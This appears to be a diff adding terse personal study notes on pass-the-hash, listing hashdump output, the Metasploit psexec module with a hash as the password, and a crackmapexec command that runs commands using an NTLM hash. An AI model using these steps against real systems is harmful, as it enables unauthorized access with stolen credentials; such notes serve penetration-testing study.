@@ -1,0 +1,19 @@
+exloit that involves capturing ntlm hashes or clear text passwords and using them to authenticate legitimatly
+multiple tools can be used
+  metasploit psexec module
+  crackmapexec
+allows access legitimatly 
+
+copy ntlm hash and put it in a text file
+to get lm hash:
+  hashdump
+    user:sid:LMhash:NTLMhash
+ copy and paste the lmhash:ntlmhash
+search psexec 
+  use 9 (exploit/windows/smb/psexec authenticated user code execution)
+    set options (set smbpass can be a hash lmhash:ntlmhash)
+    
+    
+    
+ crackmapexec smb <IP> -u <username> -H "<NTLM hash>" -x "command"
+    
